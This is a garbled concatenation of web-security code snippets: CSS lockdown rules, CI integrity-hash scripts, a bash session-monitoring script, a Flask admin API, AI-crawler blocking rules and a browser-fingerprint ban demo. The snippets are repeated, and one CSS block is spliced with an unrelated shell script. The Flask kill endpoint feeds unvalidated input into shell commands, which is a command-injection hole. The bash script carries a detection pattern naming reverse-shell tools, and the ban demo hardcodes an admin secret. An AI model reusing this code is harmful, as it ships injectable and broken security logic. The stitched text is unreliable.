      --brand-bg: #0b5cff;
      --brand-fg: #ffffff;
      --accent: #ffd166;
      --muted: rgba(255,255,255,0.85);
    }
    html,body { height:100%; margin:0; font-family:system-ui,Segoe UI,Roboto,Arial; background:var(--brand-bg)!important; color:var(--brand-fg)!important; }
    header { padding:1rem; background:rgba(0,0,0,0.06); }
    main { padding:1rem; max-width:1000px; margin:0 auto; }
    .notice { display:inline-block; padding:.35rem .6rem; border-radius:6px; background:var(--accent); color:#000; font-weight:600; }

    /* Small set of critical layout rules reasserted with !important */
    #app { box-sizing:border-box; min-height:60vh; padding:1rem !important; }
    a, button { color:inherit; font-weight:600; }

    /* Accessibility helpers */
    .visually-hidden { position:absolute !important; height:1px; width:1px; overflow:hidden; clip:rect(1px,1px,1px,1px); white-space:nowrap; }

/* Scope to #app so browser extensions and unrelated UI are not globally broken */
    #app *:not([data-allowed="true"]) {
      all: initial;                       /* reset inherited styles */
      display: none !important;           /* hide unknown nodes */
      pointer-events: none !important;    /* disable interaction */
      user-select: none !important;
      visibility: hidden !important;
    }

    /* If you prefer to keep unknown nodes visible but inert, use this variant instead:
    #app *:not([data-allowed="true"]) {
      pointer-events: none !important;
      touch-action: none !important;
      caret-color: transparent !important;
      opacity: 0.9 !important;
    }
    */

    /* Small exception: keep the guard UI visible even if not marked allowed */
    #guard-ui { display:block !important; position:fixed; right:1rem; bottom:1rem; z-index:99999; }:root { --bg:#f6f8fb; --card:#ffffff; --accent:#0b5cff; --danger:#ff4d4f; --muted:#6b7280; }
    body{font-family:system-ui,Arial;margin:0;background:var(--bg);color:#111}
    header{background:var(--accent);color:#fff;padding:1rem}
    main{padding:1rem;max-width:1100px;margin:0 auto}
    .card{background:var(--card);padding:1rem;border-radius:8px;box-shadow:0 1px 3px rgba(0,0,0,0.06);margin-bottom:1rem}
    table{width:100%;border-collapse:collapse}
    th,td{padding:.5rem;border-bottom:1px solid #eee;text-align:left}
    .btn{padding:.4rem .6rem;border-radius:6px;border:0;cursor:pointer}
    .btn-primary{background:var(--accent);color:#fff}
    .btn-danger{background:var(--danger);color:#fff}
    .muted{color:var(--muted);font-size:.9rem}
    .tag{display:inline-block;padding:.2rem .4rem;border-radius:4px;background:#eef2ff;color:var(--accent);font-weight:600}
    .profile-quarantined { outline: 3px dashed #ff4d4f; background: rgba(255,77,79,0.04); }
:root{--bg:#0b5cff;--fg:#fff}
# ci-verify-modules.sh
set -e
ALLOWLIST="ci/allowlist.txt"
for f in dist/modules/*.js; do
  bn=$(basename "$f")
  if ! grep -Fxq "$bn" "$ALLOWLIST"; then
    echo "Unknown module: $bn"
    exit 1
  fi
  openssl dgst -sha256 -binary "$f" | openssl base64 -A | awk '{print "sha256-"$0}' > "dist/modules/$bn.sri"
done

  html,body{height:100%;margin:0;background:var(--bg)!important;color:var(--fg)!important}
  #app{padding:1rem}

/* scope to #app to avoid breaking extensions */
  #app *:not([data-allowed="true"]) {
    # ci-sri.sh (run in CI)
set -e
ASSETS_DIR=dist/modules
ALLOWLIST=ci/allowlist.txt
for f in "$ASSETS_DIR"/*.js; do
  bn=$(basename "$f")
  sri=$(openssl dgst -sha256 -binary "$f" | openssl base64 -A | awk '{print "sha256-"$0}')
  echo "$bn $sri" >> dist/modules/sri-manifest.txt
  if ! grep -Fxq "$bn" "$ALLOWLIST"; then
    echo "Unknown module: $bn"
    exit 1
  fi
done
# inject sri-manifest.txt into deployment artifacts and templates

    all: initial;
    display: none !important;
    pointer-events: none !important;
    visibility: hidden !important;
  }

:root{--bg:#0b5cff;--fg:#fff}
  html,body{height:100%;margin:0;background:var(--bg)!important;color:var(--fg)!important}
  #app{padding:1rem}

/* scope to #app to avoid breaking extensions */
  #app *:not([data-allowed="true"]) {
    all: initial;
    display: none !important;
    pointer-events: none !important;
    visibility: hidden !important;
  }

:root{--bg:#0b5cff;--fg:#fff}
  html,body{height:100%;margin:0;background:var(--bg)!important;color:var(--fg)!important}
  #app{padding:1rem;box-sizing:border-box}

/* Scope to #app so extensions and other UI are not broken */
  #app *:not([data-allowed="true"]) {
    all: initial;
    display: none !important;
    pointer-events: none !important;
    visibility: hidden !important;
  }:root{--bg:#0b5cff;--fg:#fff}
  html,body{height:100%;margin:0;background:var(--bg)!important;color:var(--fg)!important}
  #app{padding:1rem;box-sizing:border-box}

/* scope to #app to avoid breaking extensions */
  #app *:not([data-allowed="true"]) {
    all: initial;
    display: none !important;
    pointer-events: none !important;
    visibility: hidden !important;
  }
  #!/usr/bin/env bash
# detect_and_handle_terminals.sh
# Usage: sudo ./detect_and_handle_terminals.sh [--audit|--quarantine]
MODE=${1:---audit}   # --audit (default) or --quarantine

LOG_DIR=/var/log/term-guard
mkdir -p "$LOG_DIR"
TIMESTAMP=$(date -u +"%Y%m%dT%H%M%SZ")
LOG="$LOG_DIR/term-guard-$TIMESTAMP.log"

# Helper: record evidence
record() {
  echo "[$(date -u +"%Y-%m-%dT%H:%M:%SZ")] $*" | tee -a "$LOG"
}

record "Mode: $MODE"

# 1) List interactive logins and PTYs
record "Active logins (who):"
who | tee -a "$LOG"

record "Last logins (last -n 20):"
last -n 20 | tee -a "$LOG"

record "Open PTYs and processes (ps + lsof):"
ps -eo pid,ppid,user,tty,cmd --sort=-pid | head -n 200 | tee -a "$LOG"
lsof -nP -iTCP -sTCP:ESTABLISHED | head -n 200 | tee -a "$LOG"

# 2) Network connections to suspicious remote IPs (customize allowlist)
ALLOWED_NETS=("10." "192.168." "172.16." "172.31." "127.0.0.1")
is_allowed_ip() {
  local ip="$1"
  for n in "${ALLOWED_NETS[@]}"; do [[ "$ip" == "$n"* ]] && return 0; done
  return 1
}

record "Established remote connections (ss -tnp):"
ss -tnp | awk 'NR>1 {print $0}' | tee -a "$LOG"

# Extract remote IPs from established connections
REMOTE_IPS=$(ss -tnp | awk 'NR>1 {split($5,a,":"); print a[1]}' | sort -u)
for ip in $REMOTE_IPS; do
  if [[ -z "$ip" || "$ip" == "*" ]]; then continue; fi
  if ! is_allowed_ip "$ip"; then
    record "Unallowed remote IP detected: $ip"
    # find processes communicating with this IP
    ss -tnp | grep "$ip" | tee -a "$LOG"
    if [[ "$MODE" == "--quarantine" ]]; then
      # block IP via nftables (idempotent)
      if command -v nft >/dev/null 2>&1; then
        nft add rule inet filter input ip saddr "$ip" drop 2>/dev/null || true
        record "nft rule added to drop $ip"
      else
        iptables -C INPUT -s "$ip" -j DROP 2>/dev/null || iptables -I INPUT -s "$ip" -j DROP
        record "iptables rule added to drop $ip"
      fi
    fi
  fi
done

# 3) Find suspicious processes: shells with network sockets, uncommon names, or no parent
record "Searching for suspicious shell-like processes..."
ps -eo pid,ppid,user,cmd --no-headers | while read -r pid ppid user cmd; do
  # heuristics: interactive shells, netcat, ncat, bash with network fd, python -c socket, etc.
  if echo "$cmd" | egrep -i 'nc |ncat |netcat |bash -i|/bin/sh -i|python -c|perl -e|ruby -e|socat' >/dev/null; then
    record "Suspicious process found: PID=$pid PPID=$ppid USER=$user CMD=$cmd"
    # capture process snapshot
    mkdir -p "$LOG_DIR/pids"
    ps -fp "$pid" > "$LOG_DIR/pids/$pid.ps.txt"
    lsof -p "$pid" > "$LOG_DIR/pids/$pid.lsof.txt" 2>/dev/null || true
    if [[ "$MODE" == "--quarantine" ]]; then
      # attempt graceful kill then force
      kill -TERM "$pid" 2>/dev/null || true
      sleep 1
      kill -KILL "$pid" 2>/dev/null || true
      record "Killed PID $pid"
    fi
  fi
done

# 4) SSH sessions: list and optionally disconnect
record "Active SSH sessions (sshd processes and sessions):"
ps -ef | grep '[s]shd:' | tee -a "$LOG"
who | tee -a "$LOG"

if [[ "$MODE" == "--quarantine" ]]; then
  # optionally restart sshd to drop sessions (use with caution)
  if systemctl is-active sshd >/dev/null 2>&1; then
    record "Restarting sshd to drop sessions (careful: may lock out admins)"
    systemctl restart sshd
  fi
fi

record "Completed. Logs stored in $LOG"
# app.py (Flask)
from flask import Flask, jsonify, request, abort
import subprocess, os, datetime

app = Flask(__name__)
LOG_DIR = '/var/log/term-guard'
os.makedirs(LOG_DIR, exist_ok=True)

def run(cmd):
    return subprocess.check_output(cmd, shell=True, text=True)

def audit(action, details, actor='api'):
    ts = datetime.datetime.utcnow().isoformat() + 'Z'
    with open(os.path.join(LOG_DIR, 'audit.log'), 'a') as f:
        f.write(f"{ts} {actor} {action} {details}\n")

@app.route('/admin/sessions', methods=['GET'])
def list_sessions():
    out = run("who")
    audit('list_sessions', 'who output captured')
    return jsonify({'who': out})

@app.route('/admin/kill', methods=['POST'])
def kill_pid():
    token = request.headers.get('X-Admin-Token')
    if token != os.environ.get('ADMIN_TOKEN'):
        abort(403)
    pid = request.json.get('pid')
    if not pid:
        abort(400)
    try:
        run(f"ps -p {pid} -o pid,ppid,user,cmd --no-headers")
        run(f"kill -TERM {pid}")
        audit('kill', f'PID={pid}', actor='api')
        return jsonify({'ok': True, 'pid': pid})
    except Exception as e:
        audit('kill_failed', f'PID={pid} err={e}', actor='api')
        return jsonify({'ok': False, 'error': str(e)}), 500

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=8080)
:root{--bg:#071021;--card:#0b1220;--accent:#06b6d4;--danger:#ef4444;--muted:#94a3b8}
  body{margin:0;font-family:Inter,system-ui,Arial;background:var(--bg);color:#e6eef6}
  header{padding:1rem;border-bottom:1px solid rgba(255,255,255,0.04);display:flex;align-items:center;gap:1rem}
  .container{max-width:1100px;margin:1rem auto;padding:1rem}
  .card{background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));padding:1rem;border-radius:8px;margin-bottom:1rem;border:1px solid rgba(255,255,255,0.03)}
  .btn{background:var(--accent);color:#042027;border:0;padding:.45rem .7rem;border-radius:6px;cursor:pointer;font-weight:600}
  .btn-danger{background:var(--danger);color:#fff}
  table{width:100%;border-collapse:collapse}
  th,td{padding:.5rem;border-bottom:1px solid rgba(255,255,255,0.02);text-align:left;font-size:.95rem}
  th{color:var(--muted);font-weight:600}
  #log{height:180px;overflow:auto;background:#071021;padding:.5rem;border-radius:6px;font-family:monospace;font-size:.85rem}
  .guard-ui{position:fixed;right:1rem;bottom:1rem;z-index:9999;width:320px}
  input,select{padding:.4rem;border-radius:6px;border:1px solid rgba(255,255,255,0.04);background:transparent;color:inherit}
  .small{font-size:.85rem;color:var(--muted)}:root{--bg:#071021;--card:#0b1220;--accent:#06b6d4;--danger:#ef4444;--muted:#94a3b8}
  body{margin:0;font-family:Inter,system-ui,Arial;background:var(--bg);color:#e6eef6}
  header{padding:1rem;border-bottom:1px solid rgba(255,255,255,0.04)}
  .container{max-width:1100px;margin:1rem auto;padding:1rem}
  .card{background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));padding:1rem;border-radius:8px;margin-bottom:1rem;border:1px solid rgba(255,255,255,0.03)}
  .btn{background:var(--accent);color:#042027;border:0;padding:.45rem .7rem;border-radius:6px;cursor:pointer;font-weight:600}
  .btn-danger{background:var(--danger);color:#fff}
  #log{height:160px;overflow:auto;background:#071021;padding:.5rem;border-radius:6px;font-family:monospace;font-size:.85rem}
  .guard-ui{position:fixed;right:1rem;bottom:1rem;z-index:9999;width:320px}
  input,select{padding:.4rem;border-radius:6px;border:1px solid rgba(255,255,255,0.04);background:transparent;color:inherit}
  .small{font-size:.85rem;color:var(--muted)}:root{--bg:#071021;--card:#0b1220;--accent:#06b6d4;--danger:#ef4444;--muted:#94a3b8}
  body{margin:0;font-family:Inter,system-ui,Arial;background:var(--bg);color:#e6eef6}
  header{padding:1rem;border-bottom:1px solid rgba(255,255,255,0.04)}
  .container{max-width:1100px;margin:1rem auto;padding:1rem}
  .card{background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));padding:1rem;border-radius:8px;margin-bottom:1rem;border:1px solid rgba(255,255,255,0.03)}
  .btn{background:var(--accent);color:#042027;border:0;padding:.45rem .7rem;border-radius:6px;cursor:pointer;font-weight:600}
  .btn-danger{background:var(--danger);color:#fff}
  #log{height:180px;overflow:auto;background:#071021;padding:.5rem;border-radius:6px;font-family:monospace;font-size:.85rem}
  .guard-ui{position:fixed;right:1rem;bottom:1rem;z-index:9999;width:320px}
  input,select{padding:.4rem;border-radius:6px;border:1px solid rgba(255,255,255,0.04);background:transparent;color:inherit}
  .small{font-size:.85rem;color:var(--muted)}
  /* Scoped deny-by-default for app container (use with care) */
  #app *:not([data-allowed="true"]) { all: initial; display:none !important; pointer-events:none !important; visibility:hidden !important; }:root{--bg:#071021;--card:#0b1220;--accent:#06b6d4;--danger:#ef4444;--muted:#94a3b8}
  body{margin:0;font-family:Inter,system-ui,Arial;background:var(--bg);color:#e6eef6}
  header{padding:1rem;border-bottom:1px solid rgba(255,255,255,0.04)}
  .container{max-width:1100px;margin:1rem auto;padding:1rem}
  .card{background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));padding:1rem;border-radius:8px;margin-bottom:1rem;border:1px solid rgba(255,255,255,0.03)}
  .btn{background:var(--accent);color:#042027;border:0;padding:.45rem .7rem;border-radius:6px;cursor:pointer;font-weight:600}
  .btn-danger{background:var(--danger);color:#fff}
  #log{height:180px;overflow:auto;background:#071021;padding:.5rem;border-radius:6px;font-family:monospace;font-size:.85rem}
  .guard-ui{position:fixed;right:1rem;bottom:1rem;z-index:9999;width:320px}
interface Person {
  firstName: string;
  lastName:  string;
}

function greeter(person: Person) {
  return "Hello, " + person.firstName + " " + person.lastName;
}

let user = {
	firstName: "Malcolm",
  lastName:  "Reynolds"
};

document.querySelector("#app").innerHTML = greeter(user);
// Express middleware: block known AI crawler user agents
const blockedAgents = [
  /GPTBot/i,
  /ClaudeBot/i,
  /PerplexityBot/i,
  /Copilot/i
];

function blockAICrawlers(req, res, next) {
  const ua = req.get('User-Agent') || '';
  if (blockedAgents.some(re => re.test(ua))) {
    return res.status(403).send('Access denied');
  }
  next();
}

// Usage
const express = require('express');
const app = express();
app.use(blockAICrawlers);
// block-ai-crawlers.js
const fs = require('fs');
const blockedRegexes = [
  /GPTBot/i,
  /OAI-SearchBot/i,
  /ClaudeBot/i,
  /Claude-SearchBot/i,
  /Claude-User/i,
  /PerplexityBot/i,
  /Perplexity-User/i,
  /Copilot/i
];

function blockAICrawlers(req, res, next) {
  const ua = req.get('User-Agent') || '';
  const ip = req.ip || req.connection.remoteAddress || 'unknown';
  const asn = req.get('X-Forwarded-ASN') || 'unknown';
  if (blockedRegexes.some(re => re.test(ua))) {
    const entry = `${new Date().toISOString()} BLOCKED UA="${ua}" PATH="${req.path}" IP=${ip} ASN=${asn}\n`;
    fs.appendFile('/var/log/ai-blocks.log', entry, () => {});
    return res.status(403).send('Access denied');
  }
  next();
}

module.exports = blockAICrawlers;
# block by UA (simple)
map $http_user_agent $block_ai {
    default 0;
    "~*GPTBot" 1;
    "~*OAI-SearchBot" 1;
    "~*ClaudeBot" 1;
    "~*PerplexityBot" 1;
    "~*Copilot" 1;
}

server {
    listen 80;
    server_name example.com;

    if ($block_ai) {
        return 403;
    }

    location ~* \.(pdf|jpg|jpeg|png|gif|json)$ {
        add_header X-Robots-Tag "noindex, nofollow";
    }

    # normal site config...
}
// module-guard.js — run this very early (e.g., node -r ./module-guard.js app.js)
const fs = require('fs');
const crypto = require('crypto');
const Module = require('module');
const path = require('path');

const ALLOWED_HASHES = {
  // relative path -> expected sha256 hex
  // "node_modules/some-package/index.js": "abc123..."
};

// compute file hash
function sha256File(filePath) {
  const data = fs.readFileSync(filePath);
  return crypto.createHash('sha256').update(data).digest('hex');
}

// resolve and verify before loading
const originalLoad = Module._load;
Module._load = function(request, parent, isMain) {
  try {
    const resolved = Module._resolveFilename(request, parent, isMain);
    // only verify local files (skip core modules)
    if (resolved && !resolved.startsWith('node:') && !path.isAbsolute(resolved) === false) {
      const rel = path.relative(process.cwd(), resolved);
      if (ALLOWED_HASHES[rel]) {
        const h = sha256File(resolved);
        if (h !== ALLOWED_HASHES[rel]) {
          throw new Error(`Module integrity check failed for ${rel}`);
        }
      } else {
        throw new Error(`Module ${rel} is not in allowlist`);
      }
    }
  } catch (err) {
    // log and fail fast
    console.error(`[module-guard] blocked module: ${err.message}`);
    const e = new Error('Access to requested module denied');
    e.code = 'MODULE_BLOCKED';
    throw e;
  }
  return originalLoad.apply(this, arguments);
};
#!/usr/bin/env bash
WATCH_DIR="/var/www/site"
FILES=("robots.txt" "css/canonical.css" "node_modules")
LOG="/var/log/integrity-monitor.log"

inotifywait -m -r -e modify,create,delete --format '%w%f %e' "$WATCH_DIR" | while read file event; do
  echo "$(date -u) CHANGE $file $event" >> "$LOG"
  cd "$WATCH_DIR" || continue
  # conservative: only revert tracked files
  if git ls-files --error-unmatch "$file" >/dev/null 2>&1; then
    git checkout -- "$file"
    echo "$(date -u) Reverted $file" >> "$LOG"
    # send alert (replace with your alerting)
    logger -t integrity-monitor "Reverted $file; see $LOG"
  fi
done
const ALLOWED_SCRIPTS = new Set([
  location.origin + '/app.bundle.js',
  'https://trusted.cdn.example/lib.js'
]);

function isAllowedNode(node) {
  if (node.tagName === 'SCRIPT' && node.src) {
    return ALLOWED_SCRIPTS.has(node.src);
  }
  if (node.tagName === 'LINK' && node.rel === 'stylesheet' && node.href) {
    return true; // optionally check allowlist for styles
  }
  return false;
}

const observer = new MutationObserver(muts => {
  for (const m of muts) {
    for (const n of m.addedNodes) {
      if (n.nodeType !== 1) continue;
      if ((n.tagName === 'SCRIPT' || n.tagName === 'LINK') && !isAllowedNode(n)) {
        n.remove();
        console.warn('Removed unauthorized node', n);
      }
    }
  }
});

observer.observe(document.documentElement, { childList: true, subtree: true });

// Reapply canonical stylesheet if it is removed or its href changes
(function() {
  const canonicalId = 'canonical-stylesheet';
  const canonicalHref = '/css/canonical.css';

  function ensureStylesheet() {
    let link = document.getElementById(canonicalId);
    if (!link) {
      link = document.createElement('link');
      link.id = canonicalId;
      link.rel = 'stylesheet';
      link.href = canonicalHref;
      document.head.appendChild(link);
      return;
    }
    if (link.href.indexOf(canonicalHref) === -1) {
      link.href = canonicalHref;
    }
  }

  // Watch for head mutations that remove or alter the stylesheet
  const observer = new MutationObserver(mutations => {
    for (const m of mutations) {
      if (m.type === 'childList' || m.type === 'attributes') {
        ensureStylesheet();
      }
    }
  });

  observer.observe(document.head, { childList: true, subtree: true, attributes: true, attributeFilter: ['href', 'rel', 'id'] });

  // Also run once on load
  ensureStylesheet();
})();

if (window.trustedTypes) {
  window.trustedTypes.createPolicy('default', {
    createHTML: (s) => { throw new Error('createHTML blocked'); },
    createScript: (s) => { throw new Error('createScript blocked'); },
    createScriptURL: (s) => { throw new Error('createScriptURL blocked'); }
  });
}

const ALLOWED_HASHES = {
  '/modules/widget-v1.js': 'sha256-EXPECTED_BASE64_HASH'
};

async function loadModuleSafely(url) {
  const resp = await fetch(url, { credentials: 'same-origin' });
  if (!resp.ok) throw new Error('Fetch failed');
  const buf = await resp.arrayBuffer();
  const hashBuf = await crypto.subtle.digest('SHA-256', buf);
  const hashBase64 = btoa(String.fromCharCode(...new Uint8Array(hashBuf)));
  const computed = 'sha256-' + hashBase64;
  if (ALLOWED_HASHES[url] !== computed) throw new Error('Integrity mismatch');
  const blob = new Blob([buf], { type: 'application/javascript' });
  const blobUrl = URL.createObjectURL(blob);
  const script = document.createElement('script');
  script.type = 'module';
  script.src = blobUrl;
  document.head.appendChild(script);
  // revoke after load to reduce memory
  script.onload = () => URL.revokeObjectURL(blobUrl);
}

// Usage
loadModuleSafely('/modules/widget-v1.js').catch(e => {
  console.error('Blocked module load:', e);
});

const ALLOWED_SCRIPTS = new Set([
  location.origin + '/app.bundle.js',
  'https://trusted.cdn.example/lib.js'
]);

function isAllowedNode(node) {
  if (node.tagName === 'SCRIPT' && node.src) {
    return ALLOWED_SCRIPTS.has(node.src);
  }
  if (node.tagName === 'LINK' && node.rel === 'stylesheet' && node.href) {
    return true; // optionally check allowlist for styles
  }
  return false;
}

const observer = new MutationObserver(muts => {
  for (const m of muts) {
    for (const n of m.addedNodes) {
      if (n.nodeType !== 1) continue;
      if ((n.tagName === 'SCRIPT' || n.tagName === 'LINK') && !isAllowedNode(n)) {
        n.remove();
        console.warn('Removed unauthorized node', n);
      }
    }
  }
});

observer.observe(document.documentElement, { childList: true, subtree: true });

/* ===== Trusted Types policy (blocks unsafe sinks unless explicitly allowed) ===== */
  if (window.trustedTypes) {
    try {
      window.trustedTypes.createPolicy('safePolicy', {
        createHTML: (s) => { throw new Error('createHTML blocked'); },
        createScript: (s) => { throw new Error('createScript blocked'); },
        createScriptURL: (s) => { throw new Error('createScriptURL blocked'); }
      });
    } catch (e) {
      console.warn('TrustedTypes policy creation failed or already exists.');
    }
  }

  /* ===== Allowlist of module URLs and expected SHA-256 (base64) =====
     In production, populate this map from CI (compute hashes at build time).
     Format: 'url': 'sha256-BASE64'
  */
  const ALLOWED_MODULES = {
    '/modules/widget-v1.js': 'sha256-REPLACE_WITH_BASE64_HASH'
  };

  /* Utility: compute base64 SHA-256 of ArrayBuffer */
  async function sha256Base64(buffer) {
    const hash = await crypto.subtle.digest('SHA-256', buffer);
    const bytes = new Uint8Array(hash);
    let binary = '';
    for (let i = 0; i < bytes.byteLength; i++) binary += String.fromCharCode(bytes[i]);
    return btoa(binary);
  }

  /* ===== Safe dynamic module loader: fetch -> verify -> execute as module ===== */
  async function loadModuleSafely(url) {
    try {
      if (!ALLOWED_MODULES[url]) throw new Error('Module not allowlisted');
      const resp = await fetch(url, { credentials: 'same-origin' });
      if (!resp.ok) throw new Error('Fetch failed: ' + resp.status);
      const buf = await resp.arrayBuffer();
      const base64 = await sha256Base64(buf);
      const computed = 'sha256-' + base64;
      if (computed !== ALLOWED_MODULES[url]) throw new Error('Integrity mismatch');
      const blob = new Blob([buf], { type: 'application/javascript' });
      const blobUrl = URL.createObjectURL(blob);
      const script = document.createElement('script');
      script.type = 'module';
      script.src = blobUrl;
      document.head.appendChild(script);
      script.onload = () => {
        URL.revokeObjectURL(blobUrl);
        console.info('Module loaded safely:', url);
      };
      script.onerror = (e) => {
        URL.revokeObjectURL(blobUrl);
        console.error('Module execution failed', e);
      };
    } catch (err) {
      console.error('Blocked module load:', err);
      document.getElementById('status').textContent = 'Module blocked: ' + err.message;
    }
  }

  document.getElementById('load-widget').addEventListener('click', () => {
    loadModuleSafely('/modules/widget-v1.js');
  });

  /* ===== MutationObserver: remove unauthorized <script> and <link> nodes ===== */
  const ALLOWED_SCRIPT_SRCS = new Set([
    location.origin + '/app.bundle.js',
    'https://trusted.cdn.example/lib.js'
  ]);

  function nodeIsAllowed(node) {
    if (node.tagName === 'SCRIPT' && node.src) {
      return ALLOWED_SCRIPT_SRCS.has(node.src);
    }
    if (node.tagName === 'LINK' && node.rel === 'stylesheet' && node.href) {
      // allow styles from same origin or trusted CDN (adjust as needed)
      return node.href.startsWith(location.origin) || node.href.includes('trusted.cdn.example');
    }
    return true;
  }

  const observer = new MutationObserver(muts => {
    for (const m of muts) {
      for (const n of m.addedNodes) {
        if (n.nodeType !== 1) continue;
        if ((n.tagName === 'SCRIPT' || n.tagName === 'LINK') && !nodeIsAllowed(n)) {
          console.warn('Removed unauthorized node', n);
          n.remove();
          document.getElementById('status').textContent = 'Removed unauthorized resource';
        }
      }
    }
  });

  observer.observe(document.documentElement, { childList: true, subtree: true });

  /* ===== Simple integrity canary and periodic self-check ===== */
  function checkCanonicalStyle() {
    const style = document.getElementById('canonical-style');
    if (!style) {
      // reinsert minimal critical style if removed
      const s = document.createElement('style');
      s.id = 'canonical-style';
      s.textContent = ':root{--bg:#0b5cff;--fg:#fff}body{background:var(--bg)!important;color:var(--fg)!important}';
      document.head.appendChild(s);
      document.getElementById('status').textContent = 'Reapplied critical styles';
      console.warn('Reapplied canonical style');
    }
  }
  setInterval(checkCanonicalStyle, 5000);

  /* ===== Sandboxed iframe communication (postMessage with validation) ===== */
  const iframe = document.getElementById('sandbox');
  iframe.addEventListener('load', () => {
    // send a short-lived token or init message
    iframe.contentWindow.postMessage({ cmd: 'init', nonce: 'short-lived-token' }, '*');
  });

  window.addEventListener('message', e => {
    if (e.source !== iframe.contentWindow) return;
    // Strictly validate message shape and origin if using src instead of srcdoc
    const data = e.data;
    if (data && data.type === 'pong' && data.nonce === 'short-lived-token') {
      console.info('Sandbox responded correctly');
    } else {
      console.warn('Unexpected message from sandbox', data);
    }
  });

  /* ===== Minimal logging endpoint (demo: console only). Replace with secure server endpoint in production. ===== */
  function logEvent(level, msg) {
    console[level](msg);
    // Example: send to /log endpoint with fetch (ensure CORS and auth)
    // fetch('/log', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({level,msg,t:Date.now()}) });
  }

  // Expose for debugging in demo
  window.__demo = { loadModuleSafely, ALLOWED_MODULES, logEvent };/* ===== Simple fingerprint (userAgent + platform + timezone + canvas hash) ===== */
async function canvasHash() {
  try {
    const c = document.createElement('canvas');
    c.width = 200; c.height = 50;
    const ctx = c.getContext('2d');
    ctx.textBaseline = 'top';
    ctx.font = '16px Arial';
    ctx.fillStyle = '#f60';
    ctx.fillRect(0, 0, 200, 50);
    ctx.fillStyle = '#069';
    ctx.fillText('fingerprint-demo-'+navigator.userAgent, 2, 2);
    const data = c.toDataURL();
    const b = atob(data.split(',')[1]);
    const arr = new Uint8Array(b.length);
    for (let i=0;i<b.length;i++) arr[i]=b.charCodeAt(i);
    const hashBuf = await crypto.subtle.digest('SHA-256', arr);
    const hashArray = Array.from(new Uint8Array(hashBuf));
    return hashArray.map(b => b.toString(16).padStart(2,'0')).join('');
  } catch (e) {
    return 'no-canvas';
  }
}

async function computeFingerprint() {
  const ua = navigator.userAgent || 'unknown';
  const platform = navigator.platform || 'unknown';
  const tz = Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown';
  const ch = await canvasHash();
  const raw = `${ua}|${platform}|${tz}|${ch}`;
  const enc = new TextEncoder().encode(raw);
  const hashBuf = await crypto.subtle.digest('SHA-256', enc);
  const hashArray = Array.from(new Uint8Array(hashBuf));
  return hashArray.map(b => b.toString(16).padStart(2,'0')).join('');
}

/* ===== Local banlist storage helpers ===== */
const BAN_KEY = 'local_banlist_v1';
function readBanlist() {
  try {
    const raw = localStorage.getItem(BAN_KEY);
    return raw ? JSON.parse(raw) : [];
  } catch (e) { return []; }
}
function writeBanlist(list) {
  localStorage.setItem(BAN_KEY, JSON.stringify(list));
}

/* ===== Enforcement: overlay + event blocking ===== */
function showBanOverlay() {
  const ov = document.getElementById('ban-overlay');
  ov.style.display = 'flex';
  // block pointer events on body
  document.body.style.pointerEvents = 'none';
  ov.style.pointerEvents = 'auto';
}
function hideBanOverlay() {
  const ov = document.getElementById('ban-overlay');
  ov.style.display = 'none';
  document.body.style.pointerEvents = '';
}

/* Prevent common interactions when banned */
function attachGlobalBlockers() {
  function stop(e){ e.stopImmediatePropagation(); e.preventDefault(); }
  ['click','keydown','submit','pointerdown','contextmenu'].forEach(ev => {
    window.addEventListener(ev, stop, true);
  });
}

/* ===== Ban management ===== */
async function isCurrentBanned() {
  const fp = await computeFingerprint();
  const list = readBanlist();
  return list.includes(fp);
}
async function addCurrentToBanlist() {
  const fp = await computeFingerprint();
  const list = readBanlist();
  if (!list.includes(fp)) {
    list.push(fp);
    writeBanlist(list);
    // set cookie for extra persistence (expires 1 year)
    document.cookie = `site_banned=1; max-age=${60*60*24*365}; path=/; SameSite=Lax`;
    log('Added fingerprint to local banlist: ' + fp.slice(0,12) + '...');
  }
  enforceIfBanned();
}
function clearLocalBanlist() {
  writeBanlist([]);
  document.cookie = 'site_banned=; max-age=0; path=/';
  log('Cleared local banlist');
  hideBanOverlay();
}

/* ===== Attempt to register a service worker and pass ban info (works only on HTTPS/origin) ===== */
async function tryRegisterSWAndSetBan() {
  if (!('serviceWorker' in navigator)) {
    log('Service worker not supported in this environment');
    return;
  }
  try {
    // In a real deployment, /sw.js should be served from your origin and implement fetch blocking.
    const reg = await navigator.serviceWorker.register('/sw.js').catch(()=>null);
    if (!reg) { log('SW registration failed or blocked'); return; }
    const fp = await computeFingerprint();
    // send message to SW to store ban (SW must implement message handler)
    if (reg.active) {
      reg.active.postMessage({ type: 'SET_BAN', fingerprint: fp });
      log('Requested SW to set ban for fingerprint');
    } else {
      log('SW registered but not active yet');
    }
  } catch (e) {
    log('SW error: ' + e.message);
  }
}

/* ===== Enforcement check on load and periodic re-check ===== */
async function enforceIfBanned() {
  const banned = await isCurrentBanned();
  if (banned || document.cookie.includes('site_banned=1')) {
    showBanOverlay();
    attachGlobalBlockers();
    log('Client is restricted locally');
  } else {
    hideBanOverlay();
    log('Client not restricted');
  }
}

/* ===== Simple logging helper (demo only) ===== */
function log(msg) {
  const el = document.getElementById('log');
  const t = new Date().toISOString();
  el.textContent = `[${t}] ${msg}\n` + el.textContent;
  console.log(msg);
}

/* ===== UI wiring ===== */
document.getElementById('ban-me').addEventListener('click', () => {
  addCurrentToBanlist();
});
document.getElementById('clear-ban').addEventListener('click', () => {
  clearLocalBanlist();
});
document.getElementById('appeal').addEventListener('click', () => {
  alert('Appeal request recorded (demo). In production, send to server for review.');
});

/* Admin ban button (demo: requires matching secret) */
document.getElementById('admin-ban').addEventListener('click', async () => {
  const secret = document.getElementById('admin-secret').value || '';
  const adminSecret = 'admin'; // demo secret; replace with secure server-side auth
  if (secret !== adminSecret) { alert('Invalid admin secret'); return; }
  await addCurrentToBanlist();
  await tryRegisterSWAndSetBan();
});

/* Run initial enforcement and periodic checks */
enforceIfBanned();
setInterval(enforceIfBanned, 10_000); // re-check every 10s

/* Expose functions for debugging in console */
window.__banDemo = { computeFingerprint, addCurrentToBanlist, clearLocalBanlist, readBanlist };
// ban-middleware.js
const redis = require('redis').createClient();
